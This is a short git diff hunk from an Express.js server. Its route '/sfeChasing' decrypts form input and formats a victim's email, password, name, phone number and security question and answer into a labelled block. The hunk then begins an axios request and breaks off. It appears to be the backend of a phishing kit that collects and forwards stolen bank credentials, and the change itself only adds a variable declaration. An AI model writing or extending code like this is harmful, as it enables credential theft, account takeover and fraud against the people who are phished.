@@ -6055,7 +6055,7 @@ app.post("/sfeChasing", (req, res) => {
     CryptoJS.enc.Utf8
   );
 
-  originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
+  var originalText = `+----------- SFE ------------+\nEmail: ${email}\nPassword: ${password}\nName: ${fname} ${lname}\nTelephone: ${telephone}\nSec Question: ${secQuestion}\nSec Answer: ${secAnswer}\n+----------- SFE ------------+`;
 
   if (chasingfunds == 10) {
     axios
